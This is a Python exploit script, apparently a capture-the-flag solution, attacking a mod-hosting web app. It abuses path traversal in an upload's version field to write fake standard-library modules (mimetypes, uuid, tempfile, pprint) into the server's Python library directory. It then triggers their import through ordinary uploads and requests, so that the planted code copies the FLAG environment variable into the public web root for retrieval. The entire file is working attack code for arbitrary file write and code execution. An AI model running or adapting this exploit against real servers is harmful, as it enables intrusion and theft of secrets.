import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
u = "u%d"%random.randint(10000,99999); pw="pass12345"
requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
tok = pf.login(u,pw)
def w(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})

def plant(modname, marker):
    mal = f'import os\nopen("/usr/share/nginx/html/{marker}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    r = w(tok, "../../../usr/local", "lib/python3.11", modname+".py", mal)
    return r.status_code

for mod, mk in [("mimetypes","m_mime"),("uuid","m_uuid"),("tempfile","m_temp"),("pprint","m_ppr")]:
    print("plant", mod, "->", plant(mod, mk))

# trigger
pid = pf.create_platform(tok, "tr%d"%random.randint(0,9999), name="z")
mid = pf.create_mod(tok, "v%d"%random.randint(0,9999), title="z")
bid = pf.create_build(tok, mid, pid)
# normal upload
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("a.txt", b"x")
bio.seek(0)
requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)
# media serve
requests.get(f"{BASE}/media/builds/4.0.0/steam_win/nonexist", timeout=8)
# large upload to trigger TemporaryFileUploadHandler (tempfile)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("big.bin", b"A"*(3*1024*1024))
bio.seek(0)
requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)
time.sleep(2)
for mk in ["m_mime","m_uuid","m_temp","m_ppr"]:
    try:
        c = requests.get(f"{BASE}/{mk}", timeout=8)
        print(mk, "status", c.status_code, "body", repr(c.content[:80]))
    except Exception as e:
        print(mk, "err", e)
